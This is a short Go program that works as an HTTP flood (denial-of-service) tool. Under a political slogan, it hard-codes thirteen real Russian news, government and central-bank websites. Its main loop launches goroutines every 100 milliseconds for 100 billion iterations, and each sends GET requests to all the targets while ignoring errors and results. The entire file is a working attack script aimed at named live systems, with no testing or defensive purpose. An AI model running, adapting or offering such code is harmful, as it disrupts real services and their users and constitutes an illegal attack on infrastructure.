package main

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/vardius/progress-go"
)

func MakeRequest(url string, ch chan<- string) {
	start := time.Now()
	_, err := http.Get(url)
	if err != nil {
	}
	secs := time.Since(start).Seconds()
	ch <- fmt.Sprintf("%.2f elapsed for url: %s", secs, url)
}

func processUrls(urls []string) {
	for _, url := range urls {
		ch := make(chan string)
		go MakeRequest(url, ch)
	}
}

func main() {
	log.Println("Fuck russia!")
	targets := [13]string{
		"https://lenta.ru/", "https://ria.ru/", "https://lenta.ru/", "https://ria.ru/",
		"https://ria.ru/lenta/", "https://www.rbc.ru/", "https://www.rt.com/", "http://kremlin.ru/",
		"http://en.kremlin.ru/", "https://smotrim.ru/", "https://tass.ru/", "https://tvzvezda.ru/",
		"https://cbr.ru/",
	}
	iterations := 100000000000

	bar := progress.New(0, int64(iterations))
	_, _ = bar.Start()
	defer func() {
		if _, err := bar.Stop(); err != nil {
			log.Printf("failed to finish progress: %v", err)
		}

		log.Println("Done!")
	}()

	for i := 0; i < iterations; i++ {
		go processUrls(targets[:])
		time.Sleep(100 * time.Millisecond)
		_, _ = bar.Advance(1)
	}
}
